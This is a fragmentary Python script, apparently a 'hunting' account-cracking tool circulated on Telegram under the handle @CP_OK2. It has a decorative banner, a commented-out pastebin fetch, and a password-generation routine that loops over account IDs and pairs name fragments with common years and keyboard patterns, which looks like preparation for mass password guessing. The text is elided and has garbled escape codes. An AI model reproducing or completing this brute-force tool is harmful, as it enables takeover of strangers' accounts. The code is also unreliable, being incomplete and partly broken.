...
#import requests 
#req=requests.get('https://pastebin.com/K2RCZuNr#google_vignette').text 
#PROALIO='PROALIO'
...
tlg1 = '\n————————————\namiroux By @CP_OK2————————————\n ⋯⋯⋯⋯⋯⋯⋯⧏ PRO ⧐⋯⋯⋯⋯⋯⋯⋯\n𝙿𝙻𝙴𝙰𝚂𝙴 𝚆𝙰𝙸𝚃  ➩ \nتم تشغيل الاداة\n    \nلا تـنسى ان تـرسل صـور الـصيد -  @S_LP5\n\n⋯⋯⋯⋯⋯⋯⋯⧏ PRO ⧐⋯⋯⋯⋯⋯⋯⋯ '
...
⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀  ⠀    
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁
                  tools this pro amiroux
                  
                  #amiroux-root By @CP_OK2
...
def setting():
    ...
    if hu in ['1','01']:
        ...
        for bacot in id:
            ...
            id2.insert(xx,bacot)
            print(('\033[92m—'*25)+'\n DeCoDe By @CP_OK2\n'+('—'*25))
    print('\x1b[97;1m\x1b[x1;93m[x1b[1;91m1\x1b[1;93m] \x1b[1;92mMETHOD SUPORT ALL INTARNET')
        ...
        for yuzong in id2:
            ...
            if len(nmf)<6:
                if len(frs)<3:
                    ...
                    pwv.append(frs+'19921992'+frs)
                    pwv.append(frs+'19911991'+frs)
                    pwv.append(frs+'19901990'+frs)
                    pwv.append(frs+'20032003'+frs)                              
                    pwv.append(frs+'20002000'+frs)
                    pwv.append(frs+'20012001'+frs)
                    pwv.append(frs+'11223344556677'+frs)
                    pwv.append(frs+'1122334455@'+frs)
                    pwv.append(frs+'qqqqwwww'+frs)
                    pwv.append(frs+'mmmmnnnn'+frs)
                    pwv.append(frs+'19941994'+frs)
                    pwv.append(frs+'19931993'+frs)
                    pwv.append(frs+'19801980'+frs)
                    pwv.append(frs+'19891989'+frs)
                    pwv.append(frs+'ali12345'+frs)
                    pwv.append(frs+'07700770'+frs)
                    pwv.append(frs+'ali12345'+frs)
                    pwv.append(frs+'00998877'+frs)
                    pwv.append(frs+'077807780'+frs)
                    pwv.append(frs+'07510751'+frs)
                    pwv.append(frs+'07810781'+frs)
                    pwv.append(frs+'100020003000'+frs)
                    pwv.append(frs+'100200300'+frs)
                    pwv.append(frs+'00998877'+frs)
                    pwv.append(frs+'qqwweerr'+frs)
                    pwv.append(frs+'xxxxzzzz'+frs)
                    pwv.append(frs+'oooopppp'+frs)
                    pwv.append(frs+'qwer1234'+frs)
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
